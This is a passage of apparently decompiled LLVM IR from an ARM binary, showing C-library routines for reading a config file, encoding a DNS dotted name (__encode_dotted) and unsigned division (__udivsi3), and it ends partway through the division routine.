  br i1 %tmp24, label %dec_label_pc_1782c, label %dec_label_pc_17810

dec_label_pc_17810:                               ; preds = %dec_label_pc_177f4
  store i32 %tmp7, i32* @ip, align 4
  %v0_17814 = load i32, i32* @r8, align 4
  %v1_17814 = load i32, i32* @r7, align 4
  %v2_17814 = add i32 %v1_17814, 8
  %v3_17814 = inttoptr i32 %v2_17814 to i32*
  store i32 %v0_17814, i32* %v3_17814, align 4
  %v0_17818 = load i32, i32* @r7, align 4
  %v1_17818 = load i32, i32* @ip, align 4
  %v2_17818 = inttoptr i32 %v1_17818 to i32*
  store i32 %v0_17818, i32* %v2_17818, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17820

dec_label_pc_17820:                               ; preds = %dec_label_pc_177d8, %dec_label_pc_17810
  %v0_17824 = phi i32 [ %v0_17824.pre, %dec_label_pc_177d8 ], [ 16, %dec_label_pc_17810 ]
  store i32 0, i32* @sb, align 4
  %v1_17824 = load i32, i32* @r7, align 4
  %v2_17824 = add i32 %v1_17824, 12
  %v3_17824 = inttoptr i32 %v2_17824 to i32*
  store i32 %v0_17824, i32* %v3_17824, align 4
  br label %dec_label_pc_17854

dec_label_pc_1782c:                               ; preds = %dec_label_pc_177ec, %dec_label_pc_177f4, %dec_label_pc_177bc
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_17830

dec_label_pc_17830:                               ; preds = %dec_label_pc_17780.backedge, %dec_label_pc_1774c, %dec_label_pc_1782c, %dec_label_pc_176dc
  %v0_17830 = load i32, i32* @r6, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_17718, i32* %r3.global-to-local, align 4
  %v4_17840 = inttoptr i32 %v0_17830 to i32*
  %v5_17840 = call i32 @__GI_config_read(i32* %v4_17840, i32 %v2_176e4, i32 459270, i32 %v0_17718)
  %v2_17844 = icmp eq i32 %v5_17840, 0
  br i1 %v2_17844, label %dec_label_pc_1784c, label %dec_label_pc_1772c

dec_label_pc_1784c:                               ; preds = %dec_label_pc_17830
  %v0_1784c = load i32, i32* @fp, align 4
  %v7_1784c = icmp eq i32 %v0_1784c, 1
  br i1 %v7_1784c, label %dec_label_pc_1785c, label %dec_label_pc_17854

dec_label_pc_17854:                               ; preds = %dec_label_pc_1784c, %dec_label_pc_17820
  %v0_17854 = load i32, i32* @r6, align 4
  %v1_17858 = inttoptr i32 %v0_17854 to i32*
  %v2_17858 = call i32 @__GI_config_close(i32* %v1_17858)
  br label %dec_label_pc_1785c

dec_label_pc_1785c:                               ; preds = %dec_label_pc_1772c, %.thread, %dec_label_pc_1784c, %dec_label_pc_176c0, %dec_label_pc_17854
  %v0_1785c = load i32, i32* @sb, align 4
  store i32 %v3_17664, i32* @r4, align 4
  store i32 %v9_17664, i32* @r6, align 4
  store i32 %v12_17664, i32* @r7, align 4
  store i32 %v15_17664, i32* @r8, align 4
  store i32 %v18_17664, i32* @sb, align 4
  store i32 %v24_17664, i32* @fp, align 4
  ret i32 %v0_1785c

; uselistorder directives
  uselistorder i32 %v0_17780.be, { 1, 0 }
  uselistorder i32 %v0_17718, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4 }
  uselistorder i16 8, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i16* @global_var_24070.401, { 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 0, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @__aeabi_read_tp, { 70, 31, 68, 67, 66, 65, 64, 63, 47, 46, 45, 107, 106, 105, 36, 56, 30, 29, 28, 102, 101, 98, 104, 103, 69, 13, 33, 71, 27, 26, 25, 100, 99, 97, 96, 95, 94, 21, 12, 20, 35, 58, 77, 93, 19, 5, 11, 10, 9, 8, 92, 91, 7, 40, 39, 14, 18, 17, 16, 108, 6, 1, 0, 15, 4, 3, 2, 79, 72, 34, 60, 59, 89, 90, 57, 38, 37, 41, 82, 80, 43, 44, 76, 42, 75, 74, 32, 24, 23, 54, 55, 86, 53, 85, 22, 88, 87, 50, 49, 48, 62, 61, 81, 73, 78, 52, 51, 84, 83 }
  uselistorder i32 34, { 5, 6, 7, 10, 1, 2, 0, 4, 8, 3, 9, 11 }
  uselistorder i32 129, { 0, 19, 7, 20, 21, 22, 1, 2, 5, 6, 13, 14, 15, 11, 12, 3, 16, 4, 17, 18, 8, 9, 10 }
  uselistorder i32* @fp, { 28, 29, 30, 31, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 53, 54, 55, 56, 57, 58, 59, 60, 65, 4, 5, 94, 95, 66, 67, 68, 69, 70, 71, 32, 33, 34, 35, 36, 37, 38, 39, 6, 7, 1, 49, 50, 51, 52, 61, 63, 62, 64, 2, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 72, 73, 74, 88, 89, 90, 91, 92, 93, 96, 3 }
  uselistorder label %dec_label_pc_1785c, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_17830, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1782c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17820, { 1, 0 }
  uselistorder label %dec_label_pc_17780.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_17764, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_1787c = load i32, i32* @r4, align 4
  store i32 %v3_1787c, i32* %stack_var_-32, align 4
  %v6_1787c = load i32, i32* @r5, align 4
  %v9_1787c = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_17884 = load i32, i32* @r1, align 4
  store i32 %v0_17884, i32* %r8.global-to-local, align 4
  %v0_17888 = load i32, i32* @r2, align 4
  store i32 %v0_17888, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_178f023 = icmp slt i8* %arg1, null
  store i1 %v1_178f023, i1* %cpsr_n.global-to-local, align 1
  %v2_178f024 = icmp eq i8* %arg1, null
  store i1 %v2_178f024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_178f024, label %dec_label_pc_17908, label %dec_label_pc_178fc

dec_label_pc_17894:                               ; preds = %dec_label_pc_178fc
  %v2_17894 = call i32 @__GI_strchr(i32 %v0_1789426, i32 46)
  store i32 %v2_17894, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17898 = icmp slt i32 %v2_17894, 0
  store i1 %v1_17898, i1* %cpsr_n.global-to-local, align 1
  %v2_17898 = icmp eq i32 %v2_17894, 0
  store i1 %v2_17898, i1* %cpsr_z.global-to-local, align 1
  %v0_1789c = load i32, i32* @r4, align 4
  %v2_1789c = sub i32 %v2_17894, %v0_1789c
  store i32 %v2_1789c, i32* @r5, align 4
  br i1 %v2_17898, label %dec_label_pc_178a4, label %dec_label_pc_178b0

dec_label_pc_178a4:                               ; preds = %dec_label_pc_17894
  %v1_178a4 = inttoptr i32 %v0_1789c to i8*
  %v3_178a8 = call i32 @strlen(i8* %v1_178a4)
  %sext = mul i32 %v3_178a8, 16777216
  %v1_178ac = sdiv i32 %sext, 16777216
  store i32 %v1_178ac, i32* @r5, align 4
  %v0_178bc.pre = load i32, i32* @r4, align 4
  %v0_178cc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_178b0

dec_label_pc_178b0:                               ; preds = %dec_label_pc_17894, %dec_label_pc_178a4
  %v0_178cc = phi i32 [ %v2_17894, %dec_label_pc_17894 ], [ %v0_178cc.pre, %dec_label_pc_178a4 ]
  %v0_178bc = phi i32 [ %v0_1789c, %dec_label_pc_17894 ], [ %v0_178bc.pre, %dec_label_pc_178a4 ]
  %v0_178dc = phi i32 [ %v2_1789c, %dec_label_pc_17894 ], [ %v1_178ac, %dec_label_pc_178a4 ]
  %v0_178b0 = load i32, i32* %sl.global-to-local, align 4
  %v1_178b0 = add i32 %v0_178b0, 1
  store i32 %v1_178b0, i32* %r7.global-to-local, align 4
  %v1_178b4 = load i32, i32* %sb.global-to-local, align 4
  %v2_178b4 = sub i32 %v1_178b4, %v0_178b0
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_178b8 = icmp slt i32 %v0_178dc, 0
  store i1 %v1_178b8, i1* %cpsr_n.global-to-local, align 1
  %v2_178b8 = icmp eq i32 %v0_178dc, 0
  store i1 %v2_178b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_178bc, i32* @r1, align 4
  %v0_178c0 = load i32, i32* %r8.global-to-local, align 4
  %v2_178c0 = add i32 %v0_178c0, %v1_178b0
  store i32 %v2_178c0, i32* @r0, align 4
  store i32 %v0_178dc, i32* @r2, align 4
  %v1_178c8 = add i32 %v2_178b4, -1
  store i32 %v1_178c8, i32* @r3, align 4
  %v1_178cc = add i32 %v0_178cc, 1
  store i32 %v1_178cc, i32* @r4, align 4
  br i1 %v2_178b8, label %dec_label_pc_1791c, label %dec_label_pc_178d4

dec_label_pc_178d4:                               ; preds = %dec_label_pc_178b0
  %v2_178d4 = sub i32 %v0_178dc, %v1_178c8
  %v3_178d4 = icmp ult i32 %v0_178dc, %v1_178c8
  %v4_178d4 = xor i32 %v1_178c8, %v0_178dc
  %v5_178d4 = xor i32 %v2_178d4, %v0_178dc
  %v6_178d4 = and i32 %v5_178d4, %v4_178d4
  %v7_178d4 = icmp slt i32 %v6_178d4, 0
  store i1 %v7_178d4, i1* %cpsr_v.global-to-local, align 1
  %v8_178d4 = icmp slt i32 %v2_178d4, 0
  store i1 %v8_178d4, i1* %cpsr_n.global-to-local, align 1
  %v9_178d4 = icmp eq i32 %v0_178dc, %v1_178c8
  store i1 %v9_178d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_178d4, label %dec_label_pc_178dc, label %dec_label_pc_1791c

dec_label_pc_178dc:                               ; preds = %dec_label_pc_178d4
  %v1_178dc = trunc i32 %v0_178dc to i8
  %v4_178dc = add i32 %v0_178c0, %v0_178b0
  %v5_178dc = inttoptr i32 %v4_178dc to i8*
  store i8 %v1_178dc, i8* %v5_178dc, align 1
  %v0_178e0 = call i32 @memcpy()
  store i32 %v0_178e0, i32* @r0, align 4
  %v0_178e4 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_178e4 = icmp slt i32 %v0_178e4, 0
  store i1 %v1_178e4, i1* %cpsr_n.global-to-local, align 1
  %v2_178e4 = icmp eq i32 %v0_178e4, 0
  store i1 %v2_178e4, i1* %cpsr_z.global-to-local, align 1
  %v0_178e8 = load i32, i32* @r5, align 4
  %v1_178e8 = load i32, i32* %r7.global-to-local, align 4
  %v2_178e8 = add i32 %v1_178e8, %v0_178e8
  store i32 %v2_178e8, i32* %sl.global-to-local, align 4
  br i1 %v2_178e4, label %dec_label_pc_17908, label %dec_label_pc_178dc.dec_label_pc_178f0_crit_edge

dec_label_pc_178dc.dec_label_pc_178f0_crit_edge:  ; preds = %dec_label_pc_178dc
  %v0_178f0.pre = load i32, i32* @r4, align 4
  store i32 %v0_178f0.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_178f0 = icmp slt i32 %v0_178f0.pre, 0
  store i1 %v1_178f0, i1* %cpsr_n.global-to-local, align 1
  %v2_178f0 = icmp eq i32 %v0_178f0.pre, 0
  store i1 %v2_178f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_178f0, label %dec_label_pc_17908, label %dec_label_pc_178fc

dec_label_pc_178fc:                               ; preds = %entry, %dec_label_pc_178dc.dec_label_pc_178f0_crit_edge
  %v0_1789426 = phi i32 [ %v0_178f0.pre, %dec_label_pc_178dc.dec_label_pc_178f0_crit_edge ], [ %tmp, %entry ]
  %v5_17910525 = phi i32 [ %v2_178e8, %dec_label_pc_178dc.dec_label_pc_178f0_crit_edge ], [ 0, %entry ]
  %v1_178fc = inttoptr i32 %v0_1789426 to i8*
  %v2_178fc = load i8, i8* %v1_178fc, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17900 = icmp eq i8 %v2_178fc, 0
  store i1 %v2_17900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17900, label %dec_label_pc_17908, label %dec_label_pc_17894

dec_label_pc_17908:                               ; preds = %dec_label_pc_178dc.dec_label_pc_178f0_crit_edge, %dec_label_pc_178dc, %dec_label_pc_178fc, %entry
  %v8_17914 = phi i32 [ 0, %entry ], [ %v5_17910525, %dec_label_pc_178fc ], [ %v2_178e8, %dec_label_pc_178dc ], [ %v2_178e8, %dec_label_pc_178dc.dec_label_pc_178f0_crit_edge ]
  %v0_17908 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17908 = icmp slt i32 %v0_17908, 0
  store i1 %v1_17908, i1* %cpsr_n.global-to-local, align 1
  %v2_17908 = icmp eq i32 %v0_17908, 0
  store i1 %v2_17908, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_17908, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_17908
  %v6_17910 = add i32 %v8_17914, 1
  store i32 %v6_17910, i32* @r0, align 4
  %v7_17914 = load i32, i32* %r8.global-to-local, align 4
  %v9_17914 = add i32 %v7_17914, %v8_17914
  %v10_17914 = inttoptr i32 %v9_17914 to i8*
  store i8 0, i8* %v10_17914, align 1
  %v0_17918.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_17918.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17918.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_17908, %bb
  %v2_17918 = phi i1 [ %v2_17918.pre, %bb ], [ false, %dec_label_pc_17908 ]
  %v1_17918 = phi i1 [ %v1_17918.pre, %bb ], [ %v1_17908, %dec_label_pc_17908 ]
  %v0_17918 = phi i1 [ %v0_17918.pre, %bb ], [ %v2_17908, %dec_label_pc_17908 ]
  %v3_17918 = xor i1 %v2_17918, %v1_17918
  %v4_17918 = or i1 %v0_17918, %v3_17918
  br i1 %v4_17918, label %dec_label_pc_1791c, label %.dec_label_pc_17920_crit_edge

.dec_label_pc_17920_crit_edge:                    ; preds = %bb22
  %v1_17924.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_17920

dec_label_pc_1791c:                               ; preds = %dec_label_pc_178d4, %dec_label_pc_178b0, %bb22
  br label %dec_label_pc_17920

dec_label_pc_17920:                               ; preds = %.dec_label_pc_17920_crit_edge, %dec_label_pc_1791c
  %v1_17924 = phi i32 [ %v1_17924.pre, %.dec_label_pc_17920_crit_edge ], [ -1, %dec_label_pc_1791c ]
  %v2_17920 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_17920, i32* @r4, align 4
  store i32 %v6_1787c, i32* @r5, align 4
  store i32 %v9_1787c, i32* @r6, align 4
  ret i32 %v1_17924

; uselistorder directives
  uselistorder i32 %v0_17908, { 0, 2, 1 }
  uselistorder i32 %v0_178f0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_178e4, { 1, 0 }
  uselistorder i32 %v2_178d4, { 1, 0 }
  uselistorder i32 %v1_178c8, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_178dc, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_178ac, { 1, 0 }
  uselistorder i1 %v2_178f024, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 (i8*)* @strlen, { 13, 11, 10, 9, 8, 7, 32, 31, 12, 3, 2, 1, 33, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 6, 4, 5, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 9, 5, 4, 3, 2, 1, 0, 8, 7, 6 }
  uselistorder label %dec_label_pc_17920, { 1, 0 }
  uselistorder label %dec_label_pc_1791c, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_17908, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_178fc, { 1, 0 }
  uselistorder label %dec_label_pc_178b0, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_17928 = load i32, i32* @r1, align 4
  %v1_17928 = add i32 %v0_17928, -1
  store i32 %v1_17928, i32* %r2.global-to-local, align 4
  %v2_17928 = icmp eq i32 %v0_17928, 0
  %v7_17928 = icmp eq i32 %v0_17928, 1
  %v0_1792c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_17928, i32 %v0_1792c)
  br i1 %v2_17928, label %dec_label_pc_17a10, label %dec_label_pc_17934

dec_label_pc_17934:                               ; preds = %entry
  %v0_17934 = load i32, i32* %r0.global-to-local, align 4
  %v1_17934 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_17934, %v1_17934
  br i1 %tmp, label %dec_label_pc_1793c, label %dec_label_pc_179c8

dec_label_pc_1793c:                               ; preds = %dec_label_pc_17934
  %v1_1793c = load i32, i32* %r2.global-to-local, align 4
  %v2_1793c = and i32 %v1_1793c, %v1_17934
  %v4_1793c = icmp eq i32 %v2_1793c, 0
  br i1 %v4_1793c, label %dec_label_pc_179d4, label %dec_label_pc_17944

dec_label_pc_17944:                               ; preds = %dec_label_pc_1793c
  %v3_17944 = icmp ult i32 %v1_17934, 536870912
  br i1 %v3_17944, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_17944
  %v4_17948 = mul i32 %v1_17934, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_17944, %.thread
  %v0_17968.pr36.ph = phi i32 [ %v4_17948, %.thread ], [ %v1_17934, %dec_label_pc_17944 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_17944 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_17968.pr36 = phi i32 [ %v4_1795c, %bb81 ], [ %v0_17968.pr36.ph, %.preheader.preheader ]
  %v1_17960 = phi i32 [ %v4_17960, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_17954 = icmp ugt i32 %v0_17968.pr36, 268435455
  br i1 %v2_17954, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_17968thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_17958 = icmp ult i32 %v0_17968.pr36, %v0_17934
  br i1 %v4_17958, label %bb80, label %dec_label_pc_17968thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_1795c = and i32 %v0_17968.pr36, 268435456
  %v3_1795c = icmp eq i32 %v2_1795c, 0
  %v4_1795c = mul i32 %v0_17968.pr36, 16
  br i1 %v3_1795c, label %bb81, label %dec_label_pc_17968.loopexit

bb81:                                             ; preds = %bb80
  %v2_17960 = and i32 %v1_17960, 268435456
  %v3_17960 = icmp eq i32 %v2_17960, 0
  %v4_17960 = mul i32 %v1_17960, 16
  br i1 %v3_17960, label %.preheader, label %dec_label_pc_17968thread-pre-split.loopexit.loopexit

dec_label_pc_17968thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1797448.ph = phi i32 [ %v1_17960, %bb ], [ %v4_17960, %bb81 ]
  %v0_17968.pr38.ph = phi i32 [ %v0_17968.pr36, %bb ], [ %v4_1795c, %bb81 ]
  br label %dec_label_pc_17968thread-pre-split.loopexit

dec_label_pc_17968thread-pre-split.loopexit:      ; preds = %dec_label_pc_17968thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1797448 = phi i32 [ %v1_17960, %.thread2 ], [ %v1_1797448.ph, %dec_label_pc_17968thread-pre-split.loopexit.loopexit ]
  %v0_17968.pr38 = phi i32 [ %v0_17968.pr36, %.thread2 ], [ %v0_17968.pr38.ph, %dec_label_pc_17968thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_17968thread-pre-split

dec_label_pc_17968thread-pre-split:               ; preds = %dec_label_pc_17968thread-pre-split.loopexit, %bb83
  %v1_1797446 = phi i32 [ %v1_1797448, %dec_label_pc_17968thread-pre-split.loopexit ], [ %v3_17974, %bb83 ]
  %v0_17968.pr = phi i32 [ %v0_17968.pr38, %dec_label_pc_17968thread-pre-split.loopexit ], [ %v3_17970, %bb83 ]
  br label %dec_label_pc_17968

dec_label_pc_17968.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_17968

dec_label_pc_17968:                               ; preds = %dec_label_pc_17968.loopexit, %dec_label_pc_17968thread-pre-split
  %v1_17974 = phi i32 [ %v1_1797446, %dec_label_pc_17968thread-pre-split ], [ %v1_17960, %dec_label_pc_17968.loopexit ]
  %v1_17970 = phi i32 [ %v0_17968.pr, %dec_label_pc_17968thread-pre-split ], [ %v4_1795c, %dec_label_pc_17968.loopexit ]
  %v2_17968 = icmp slt i32 %v1_17970, 0
  br i1 %v2_17968, label %dec_label_pc_1797c, label %bb82

bb82:                                             ; preds = %dec_label_pc_17968
  %v4_1796c = icmp ult i32 %v1_17970, %v0_17934
  br i1 %v4_1796c, label %bb83, label %dec_label_pc_1797c

bb83:                                             ; preds = %bb82
  %v3_17970 = mul i32 %v1_17970, 2
  %v2_17974 = icmp slt i32 %v1_17974, 0
  %v3_17974 = mul i32 %v1_17974, 2
  br i1 %v2_17974, label %dec_label_pc_1797c, label %dec_label_pc_17968thread-pre-split

dec_label_pc_1797c:                               ; preds = %bb82, %dec_label_pc_17968, %bb83
  %v2_1798859 = phi i32 [ %v3_17974, %bb83 ], [ %v1_17974, %bb82 ], [ %v1_17974, %dec_label_pc_17968 ]
  %v1_1798051 = phi i32 [ %v3_17970, %bb83 ], [ %v1_17970, %bb82 ], [ %v1_17970, %dec_label_pc_17968 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17980

dec_label_pc_17980:                               ; preds = %.thread11, %dec_label_pc_1797c
  %v1_179b4 = phi i32 [ %v4_179b4, %.thread11 ], [ %v2_1798859, %dec_label_pc_1797c ]
  %v1_17988 = phi i32 [ %v0_179c0, %.thread11 ], [ 0, %dec_label_pc_1797c ]
  %v1_179b8 = phi i32 [ %v4_179b8, %.thread11 ], [ %v1_1798051, %dec_label_pc_1797c ]
  %v1_17984 = phi i32 [ %v0_179b0, %.thread11 ], [ %v0_17934, %dec_label_pc_1797c ]
  %v3_17980 = icmp ult i32 %v1_17984, %v1_179b8
  br i1 %v3_17980, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_17980
  %v3_17984 = sub i32 %v1_17984, %v1_179b8
  store i32 %v3_17984, i32* %r0.global-to-local, align 4
  %v3_17988 = or i32 %v1_17988, %v1_179b4
  store i32 %v3_17988, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_17980, %bb84
  %v1_17990 = phi i32 [ %v1_17984, %dec_label_pc_17980 ], [ %v3_17984, %bb84 ]
  %v1_17994 = phi i32 [ %v1_17988, %dec_label_pc_17980 ], [ %v3_17988, %bb84 ]
  %v4_1798c = udiv i32 %v1_179b8, 2
  %v6_1798c = icmp ult i32 %v1_17990, %v4_1798c
  br i1 %v6_1798c, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_17990 = urem i32 %v1_179b8, 2
  %v4_17990 = icmp eq i32 %v3_17990, 0
  %v6_17990 = sub i32 %v1_17990, %v4_1798c
  store i32 %v6_17990, i32* %r0.global-to-local, align 4
  br i1 %v4_17990, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_17994 = udiv i32 %v1_179b4, 2
  %v6_17994 = or i32 %v1_17994, %v5_17994
  store i32 %v6_17994, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_1799c = phi i32 [ %v6_17990, %bb85 ], [ %v1_17990, %.thread7 ], [ %v6_17990, %bb86 ]
  %v1_179a0 = phi i32 [ %v1_17994, %bb85 ], [ %v1_17994, %.thread7 ], [ %v6_17994, %bb86 ]
  %v4_17998 = udiv i32 %v1_179b8, 4
  %v6_17998 = icmp ult i32 %v1_1799c, %v4_17998
  br i1 %v6_17998, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_1799c = and i32 %v1_179b8, 2
  %v4_1799c = icmp eq i32 %v3_1799c, 0
  %v6_1799c = sub i32 %v1_1799c, %v4_17998
  store i32 %v6_1799c, i32* %r0.global-to-local, align 4
  br i1 %v4_1799c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_179a0 = udiv i32 %v1_179b4, 4
  %v6_179a0 = or i32 %v1_179a0, %v5_179a0
  store i32 %v6_179a0, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_179a8 = phi i32 [ %v6_1799c, %bb87 ], [ %v1_1799c, %.thread8 ], [ %v6_1799c, %bb88 ]
  %v1_179ac = phi i32 [ %v1_179a0, %bb87 ], [ %v1_179a0, %.thread8 ], [ %v6_179a0, %bb88 ]
  %v4_179a4 = udiv i32 %v1_179b8, 8
  %v6_179a4 = icmp ult i32 %v1_179a8, %v4_179a4
  br i1 %v6_179a4, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_179a8 = and i32 %v1_179b8, 4
  %v4_179a8 = icmp eq i32 %v3_179a8, 0
  %v6_179a8 = sub i32 %v1_179a8, %v4_179a4
  store i32 %v6_179a8, i32* %r0.global-to-local, align 4
  br i1 %v4_179a8, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_179ac = udiv i32 %v1_179b4, 8
  %v6_179ac = or i32 %v1_179ac, %v5_179ac
  store i32 %v6_179ac, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_179c0 = phi i32 [ %v1_179ac, %bb89 ], [ %v1_179ac, %.thread9 ], [ %v6_179ac, %bb90 ]
  %v0_179b0 = phi i32 [ %v6_179a8, %bb89 ], [ %v1_179a8, %.thread9 ], [ %v6_179a8, %bb90 ]
  %v2_179b0 = icmp eq i32 %v0_179b0, 0
  br i1 %v2_179b0, label %dec_label_pc_179c0, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_179b4, 16
  br i1 %tmp138, label %dec_label_pc_179c0, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_179b4 = udiv i32 %v1_179b4, 16
  %v4_179b8 = udiv i32 %v1_179b8, 16
  br label %dec_label_pc_17980

dec_label_pc_179c0:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_179c0, i32* %r0.global-to-local, align 4
  ret i32 %v0_179c0

dec_label_pc_179c8:                               ; preds = %dec_label_pc_17934
  %v9_17934 = icmp eq i32 %v0_17934, %v1_17934
  %. = zext i1 %v9_17934 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_179d4:                               ; preds = %dec_label_pc_1793c
  %v2_179d4 = icmp ugt i32 %v1_17934, 65535
  br i1 %v2_179d4, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_179d4
  %v2_179d8 = and i32 %v1_17934, 32768
